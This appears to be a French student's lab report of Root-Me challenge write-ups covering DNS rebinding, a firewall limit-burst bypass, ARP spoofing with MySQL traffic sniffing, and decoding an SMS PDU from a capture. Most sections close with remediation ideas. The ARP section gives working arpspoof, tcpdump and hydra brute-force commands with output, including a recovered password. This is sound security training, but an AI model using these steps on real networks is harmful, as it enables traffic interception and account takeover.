TP6 : Un peu de root-me

Sommaire :

- I. DNS Rebinding
- II. Netfilter erreurs courantes
- III. ARP Spoofing Ecoute active
- IV. Bonus : Trafic Global System for Mobile communications

I. DNS Rebinding

🌞 Write-up de l'épreuve
```
    -Ce challenge root-me , comme son nom l'indique, expose une faille DNS rebinding. Le but de ce challenge est d'accéder à la page admin ("http://challenge01.root-me.org:54022/admin") contenant le flag. 
    Mais le problème, c'est qu'il faut envoyer une requete pour atteindre cette page en
étant en localhost ou bien avec l'IP 127.0.0.1. Pour mener à bien cet exercice, il me fallait soit un server DNS avec un TTL de 0 ou bien un outil me permettant de réaliser cette attaque. 
    Après m'etre bien renseigné sur ce qu'est cette attaque, j'ai effectue la recherche
"DNS service rebinding" et j'ai trouve un outil sur un github permettant de faire ce que j'ai besoin pour cette exercice. En spécifiant l'adresse IP localhost et une IP publique, j'ai pu obtenir un bout d'URL généré. En allant ensuite sur la page du challenge , je n'avais qu'a rajouté le "http" suivie du lien avec à la fin ":54022/admin". 
    En envoyant plusieurs fois cette URL, j'ai pu obtenir le flag.Il faut savoir que cet 
outil envoie une réponse aléatoire entre deux IPs c'est pour cela que j'ai du renvoyer plusieurs fois la requete tandis qu'un vrai server aurait permis d'envoyer deux requetes différentes mais spécifique.
```
🌞 Proposer une version du code qui n'est pas vulnérable

```
    Pour remédier au code afin qu'il ne soit plus vulnérable , Veuillez-trouver dans le dossier script le code "dns_rebinding.py". La faille  provient de la fonction "valid_fqdn" qui va tenter de vérifier si un nom de domaine est interne ou pas mais qui ne va pas protéger complétement contre cette vulnérablilité. 
    J'ai donc ajouter une ligne de véirification supplémentaire pour s'assurer que l'URL ne mène pas vers une page interne comme localhost.
```

II. Netfilter erreurs courantes
```
    Le but de ce challenge est de contourner les règles du pare-feu du server web afin d'obtenir le flag. Pour cela, j'ai pu télécharger les règles de ce pare-feu  pour savoir qu'est-ce que je devais faire.
    Ma logique pour cet exercice était de comprendre le principe du fonctionnement de ce firewall avec les règles de filtrage (DROP ou ACCEPT) , puis regarder les règles et les correspondances et chercher les lignes ACCEPT ou DROP. En descendant dans ce fichier .sh , je trouve ces deux lignes :
```
```
IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j DROP
IP46T -A INPUT-HTTP -j ACCEPT
```
```
    Après m'etre renseigné sur "limit-burst" j'ai compris de suite ce qu'il fallait
faire pour obtenir le flag de ce challenge. En principe, quand l'algorithme de sceau à jetons est vide, les paquets suivant ne peuvent plus correspondre à la règle et donc poursuivent leur route vers la règle suivante. 
    En l'occurence dans ce cas, il fallait donc que le nombre de requete soit supérieur
à 20 car la 21ème sera accepté puisque le dernier paquet recontrera là règle suivante.
```
🌞 Proposer un jeu de règles firewall

- Pour remedier à la vulnérabilité, je change le ACCEPT par DROP pour bloquer toute connexion non autorisée signifiant que si une requete ne correspond à aucune règle explicite, elle sera simplement ignorée ce qui diminuera les chances d'exploiter cette faille.
```
IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j DROP

IP46T -A INPUT-HTTP -j DROP
```

III. ARP Spoofing Ecoute active
```
    Le but de cet exercice cette fois-ci est de récolter des informations dans un réseau
à travers une machine que nous controlons. D'après l'énoncé de ce challenge, le flag est divisé en deux parties , d'un coté qui est la réponse d'une requete sur le réseau et de l'autre le mot de passe de la base de données.
- Je commence par savoir déjà qui je suis :
root@fac50de5d760:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
7: eth0@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```
```
- Je vais ensuite scanner mon réseau pour voir ce qu'il y'a :
root@fac50de5d760:~# nmap -sn 172.18.0.0/16
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-05 18:05 UTC
Nmap scan report for 172.18.0.1
Host is up (0.000035s latency).
MAC Address: 02:42:F6:10:3E:7B (Unknown)
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.2)
Host is up (0.000044s latency).
MAC Address: 02:42:AC:12:00:02 (Unknown)
Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000035s latency).
MAC Address: 02:42:AC:12:00:04 (Unknown)
Nmap scan report for fac50de5d760 (172.18.0.3)
Host is up.

C'est là que je remarque deux machines bien distinctes, une base de donnée avec l'ip 172.18.0.2 et un client avec l'ip 172.18.0.4.
Pour faire une attaque MITM entre ces deux machines, je vais faire une attaque ARP pour la mener à bien.
```
```
- Par la suite, je vais utiliser la commande "arpspoof" pour envoyer en continu des paquets ARP pour la falsification de la table ARP du client et de la base de données.
root@fac50de5d760:~# arpspoof -t 172.18.0.4 -r 172.18.0.2
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3
....
```
```
- Pendant que les requetes tournent en continu, je vais scanner la base de donnée pour en savoir un peu plus.
root@fac50de5d760:~# nmap 172.18.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-05 18:15 UTC
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.2)
Host is up (0.000041s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:AC:12:00:02 (Unknown)
 
Et en effet, je vois que c'est bien une base de donnée avec en plus un port ouvert (3306).
```
```
- Ducoup, avec la commande "tcpdump", je peux aller voir les données qui sont sur le réseau en précisant bien le port 3306.
root@fac50de5d760:~# tcpdump -A port 3306

Et en cherchant un peu dans les résultats, je tombe bien sur la première partie du flag :
"first part of the flag: l1tter4lly_4_c4ptur3_th3_fl4g"
```
```
- Par la suite, je vais importter une liste de mots de passes les plus fréquemment utiliser pour le brute force afin de récupérer le mot de passe de la base de données.
root@fac50de5d760:~# wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

- Je vais donc pour finir utiliser la commande "hydra" pour mener à bien cette attaque.

root@fac50de5d760:~# hydra -l root -P rockyou.txt 172.18.0.2 mysql
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-05 18:20:47
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking mysql://172.18.0.2:3306/
[3306][mysql] host: 172.18.0.2   login: root   password: heyheyhey
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-05 18:21:43
```
```
Le flag final est donc : `l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey`
```
🌞 Proposer une configuration pour empêcher votre attaque
```
- En remédiation concernant cette attaque, il faudrait dynamiser la table ARP pour évaluer chaque paquet.
Puis pour empecher de retrouver le mot de passe, il faut déjà interdire la connexion en root ... Puis dans le réseau, il faut chiffrer les échanges sinon tout est en clair et l'attaquant peut se servir.
```

IV. Bonus : Trafic Global System for Mobile communications

⭐ BONUS : Write-up de l'épreuve

```
Le but de ce challenge était qu'à partir d'une capture réseau, il fallait retrouver quelque chose et le rendre compréhensible. Après m'etre renseigné , ke saos que "Trafic Global System for Mobile Communications" est un système de gestion du trafic pour les réseaux mobiles (GSM) utilisé pour gérer et optimiser le flux des appels et des données dans les réseaux téléphoniques.
    
    Ensuite, en analysant le fichier pcap, je constate le protocole ISI. Une fois renseigné, ce protocole ISI (Inter System Interface) est un protocole de communication axé sur les réseaux téléphoniques pour facilité l'échange d'informations entre différents équipements. En faisant le lien avec le nom du titre du challenge, je sais ce que je dois faire.

    Par la suite, je vais parcourir ce fichier pcap pour trouver quelque chose d'intéressant, et effectivement, sur tous les paquets de ce fichier, le paquet 87 est nettement plus long que les autres donc ça m'attire l'attention. C'est là ou je comprend que je dois décoder potentiellement un sms avec le contenu dedans, le flag.

    Le contenu de ce paquet : 00ff9c0402030201ffff0b5a0791233010210068040b917120336603f800002140206165028047c7f79b0c52bfc52c101d5d0699d9e133283d0785e764f87b6da7956bb7f82d2c8b

Je vais ensuite effectuer une recherche "sms decoder" et je tombe sur deux sites :
https://www.diafaan.com/sms-tutorials/gsm-modem-tutorial/online-sms-pdu-decoder/
https://www.dcode.fr/code-multitap-abc

Ces deux outils fesaient largement l'affaire donc j'ai pris simplement le premier et j'ai collé le contenu.
Voici les résultats intéressant :
From :
+17023366308

Message :
Good job, the flag is ############*

SMSC :
+320301120086

Data coding :
SMS Default Alphabet

Original Encoded PDU fields
SMSC :
0791233010210068
```
